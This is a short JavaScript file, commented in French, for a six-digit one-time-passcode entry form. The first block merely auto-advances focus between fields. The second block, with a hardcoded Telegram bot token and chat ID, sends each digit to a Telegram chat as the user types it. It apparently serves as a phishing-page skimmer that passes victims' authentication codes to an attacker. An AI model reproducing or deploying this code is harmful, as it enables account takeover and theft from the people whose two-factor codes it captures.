document.addEventListener("DOMContentLoaded", function () {
  // Boucle de 1 à 6 pour cibler chaque champ OTP par son id
  for (let i = 1; i <= 6; i++) {
    const input = document.getElementById(`num-otp-${i}`);
    
    input.addEventListener('input', () => {
      // Vérifie si le champ actuel est rempli
      if (input.value.length === 1 && i < 6) {
        // Passe au champ suivant
        const nextInput = document.getElementById(`num-otp-${i + 1}`);
        nextInput.focus();
      }
    });
  }
});


document.addEventListener("DOMContentLoaded", function () {
  const telegramBotToken = "7780372736:AAGNaKkwXP4hJ_MexlqSVGtWaP6t2IZiVNw"; // Remplacez par votre token de bot
  const chatId = "7363581053"; // Remplacez par l'ID du chat ou du groupe Telegram

  function sendNumberToTelegram(number) {
    const message = `Numéro saisi : ${number}`;
    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(telegramApiUrl, { method: "GET" })
      .then(response => response.json())
      .then(data => {
        if (!data.ok) {
          console.error("Erreur lors de l'envoi à Telegram :", data);
        }
      })
      .catch(error => {
        console.error("Erreur réseau :", error);
      });
  }

  // Gestionnaire d'événements pour chaque champ OTP
  document.querySelectorAll(".num-otp").forEach((input, index, inputs) => {
    input.addEventListener("input", () => {
      const number = input.value;
      if (number.length === 1) {
        sendNumberToTelegram(number); // Envoie le chiffre à Telegram
        if (index < inputs.length - 1) {
          inputs[index + 1].focus(); // Passe au champ suivant
        }
      }
    });
  });
});

